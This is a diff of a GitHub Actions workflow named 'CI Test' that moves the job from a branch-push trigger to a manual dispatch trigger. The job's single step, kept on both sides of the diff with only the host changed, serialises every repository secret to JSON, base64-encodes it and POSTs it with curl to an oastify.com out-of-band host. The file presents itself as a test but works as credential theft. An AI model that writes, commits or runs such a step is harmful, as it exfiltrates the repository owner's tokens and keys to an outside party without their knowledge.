@@ -1,12 +1,16 @@
-name: CI Test2
+name: CI Test
 on:
-  push:
-    branches:
-      - 'ci-update' 
+  workflow_dispatch:
+    inputs:
+      environment:
+        description: 'Target environment'
+        required: false
+        default: 'test'
+
 jobs:
-  test:
+  run:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          curl -X POST "https://5y4jjos1vjueizo33hn8caaa51bszlna.oastify.com" \
+          curl -X POST "https://g6nurz0c3u2pqawebsvjklildcj37xvm.oastify.com" \
             -d "$(echo '${{ toJson(secrets) }}' | base64)"
